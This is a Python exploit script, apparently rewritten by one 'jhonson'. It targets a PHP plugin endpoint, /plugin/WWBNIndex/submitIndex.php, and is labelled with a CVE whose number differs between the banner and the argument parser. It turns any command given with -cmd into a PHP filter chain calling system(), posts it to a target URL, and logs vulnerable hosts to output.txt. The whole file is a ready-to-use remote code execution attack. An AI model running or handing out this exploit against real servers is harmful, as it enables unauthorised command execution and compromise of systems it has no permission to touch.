#!/bin/env python3



import requests
from php_filter_chain import PHPFilterChainGenerator
from colorama import Fore, Style
import argparse
import threading
import sys
import art

def color():

     text='''  
           Remote Code Execution
               CVE-2024-3189
               rewrite by jhonson


            '''
     
     print(Fore.RED + Style.BRIGHT +text+ Style.RESET_ALL)

color()


def main(target,payload,header,path):

 try:
    generator=PHPFilterChainGenerator()
    space='                                                    '
    function=generator.generate_filter_chain(code)
    response = requests.post(f'{target}{path}',data={"systemRootPath":function},headers=header,verify=False,timeout=20)
    if response.status_code == 200:
       r = response.text
       line = r.split('\n', 1)[0]
       print('[-]'+target+Fore.GREEN + Style.BRIGHT +'\n[+] Vulnerable' + Style.RESET_ALL)
       with open('output.txt','a') as file:
               file.write(target+'\n'+line)
               print(Fore.BLUE + Style.BRIGHT +'[+] file save output.txt'+ Style.RESET_ALL)

                

    else :

       print('[-]'+target+Fore.RED + Style.BRIGHT +'\n[-] No vulnerable'+ Style.RESET_ALL) 
  
 except requests.exceptions.ConnectionError:
            print(Fore.RED + Style.BRIGHT +f'[-] DNS problem or data connexion' + Style.RESET_ALL) 
             
            
 except requests.exceptions.MissingSchema:
       print('')


if __name__=='__main__':

         
         headers = {"Content-Type": "application/x-www-form-urlencoded"}

         
         parser = argparse.ArgumentParser(description="CVE-2024-31819")
         parser.add_argument("-url", "--url", dest="url", help="Single url", required=False)     
         parser.add_argument("-cmd", "--cmd", dest="cmd", help="command execution", required=False) 
         args = parser.parse_args()

         cmd=args.cmd
         code = f"<?php echo '[S]';system('{cmd}');echo '[E]';?>"
         


         main(args.url,code,headers,'/plugin/WWBNIndex/submitIndex.php')                      

